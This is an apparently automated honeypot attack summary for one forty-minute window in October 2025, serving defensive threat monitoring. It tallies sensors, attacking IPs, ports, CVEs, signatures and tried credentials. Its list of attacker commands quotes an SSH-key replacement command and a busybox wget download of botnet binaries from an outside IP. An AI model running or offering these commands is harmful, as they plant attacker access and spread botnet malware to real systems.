Honeypot Attack Summary Report

Report generated on 2025-10-23T16:01:26Z for the timeframe of 2025-10-23T15:20:01Z to 2025-10-23T16:00:01Z.

Files used to generate this report:
- agg_log_20251023T152001Z.json
- agg_log_20251023T154002Z.json
- agg_log_20251023T160001Z.json

Executive Summary:
This report summarizes honeypot activity over the last hour, compiled from three separate log files. A total of 18,263 attacks were recorded. The most prominent attack vectors involved VNC (port 5900), SMB (port 445) and SSH (port 22). A significant number of brute-force attempts and automated scans were observed from a wide range of IP addresses. Several known CVEs were targeted, and attackers attempted to run various system commands, including reconnaissance and attempts to install malicious SSH keys.

Detailed Analysis:

Attacks by honeypot:
- Cowrie: 4464
- Suricata: 3930
- Heralding: 2428
- Honeytrap: 2989
- Ciscoasa: 1727
- Sentrypeer: 760
- Tanner: 873
- Dionaea: 862
- Redishoneypot: 112
- ConPot: 21
- Mailoney: 34
- H0neytr4p: 16
- Adbhoney: 5
- Ipphoney: 4
- Honeyaml: 5
- Dicompot: 3
- ssh-rsa: 30

Top attacking IPs:
- 185.243.96.105: 2423
- 10.140.0.3: 2424
- 45.171.150.123: 787
- 195.178.110.109: 867
- 23.227.147.163: 253
- 68.219.131.79: 238
- 107.170.36.5: 251
- 157.245.67.247: 245
- 172.31.36.128: 251
- 167.99.74.18: 207
- 185.243.5.146: 201
- 193.24.211.28: 176
- 163.172.99.31: 167
- 107.150.110.167: 198
- 114.96.90.14: 143
- 202.143.111.139: 139

Top targeted ports/protocols:
- vnc/5900: 2422
- 445: 790
- 22: 674
- 5060: 760
- 80: 869
- 6379: 112
- 5903: 135
- 5901: 116
- 2052: 78
- 5904: 77
- 5905: 77
- 8333: 70

Most common CVEs:
- CVE-2021-3449
- CVE-2019-11500
- CVE-2002-0013
- CVE-2002-0012
- CVE-1999-0517
- CVE-2002-1149

Commands attempted by attackers:
- whoami
- uname -m
- lscpu | grep Model
- cat /proc/cpuinfo | grep model | grep name | wc -l
- top
- df -h | head -n 2 | awk 'FNR == 2 {print $2;}'
- uname
- uname -a
- cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa ..."
- w
- free -m | grep Mem | awk '{print $2 ,$3, $4, $5, $6, $7}'
- ls -lh $(which ls)
- which ls
- cat /proc/cpuinfo | grep name | head -n 1 | awk '{print $4,$5,$6,$7,$8,$9;}'
- crontab -l
- Enter new UNIX password: 
- cd /data/local/tmp/; rm *; busybox wget http://94.154.35.154/arm.urbotnetisass; ...
- tftp; wget; /bin/busybox ...

Signatures triggered:
- ET INFO VNC Authentication Failure
- 2002920
- ET DROP Dshield Block Listed Source group 1
- 2402000
- ET SCAN MS Terminal Server Traffic on Non-standard Port
- 2023753
- ET HUNTING RDP Authentication Bypass Attempt
- 2034857
- ET SCAN NMAP -sS window 1024
- 2009582
- ET INFO Reserved Internal IP Traffic
- 2002752
- ET WEB_SERVER Possible HTTP 404 XSS Attempt (Local Source)
- 2010517
- ET SCAN Potential SSH Scan
- 2001219
- ET INFO CURL User Agent
- 2002824

Users / login attempts:
- 345gs5662d34/345gs5662d34
- root/
- /Passw0rd
- root/cnm1020
- root/CNorte19453035
- root/ap123456
- root/roooot
- /1q2w3e4r

Files uploaded/downloaded:
- Help:Contents
- Manual:Configuration_settings
- Manual:FAQ
- mediawiki-announce
- Localisation#Translation_resources
- Manual:Combating_spam
- arm.urbotnetisass
- arm5.urbotnetisass
- arm6.urbotnetisass
- arm7.urbotnetisass
- x86_32.urbotnetisass
- mips.urbotnetisass
- mipsel.urbotnetisass

HTTP User-Agents:
- (No data)

SSH clients and servers:
- (No data)

Top attacker AS organizations:
- (No data)

Key Observations and Anomalies:
- A significant amount of scanning activity for VNC (port 5900) was observed from a small number of IPs, suggesting a targeted campaign.
- The command `cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa ..."` was frequently attempted, indicating a common tactic to compromise systems by adding an attacker's public SSH key.
- The download of multiple `*.urbotnetisass` files from the IP address 94.154.35.154 suggests an attempt to install a botnet client for various architectures.
- A large number of Suricata alerts were triggered for "ET INFO VNC Authentication Failure", which correlates with the high number of connection attempts to port 5900.
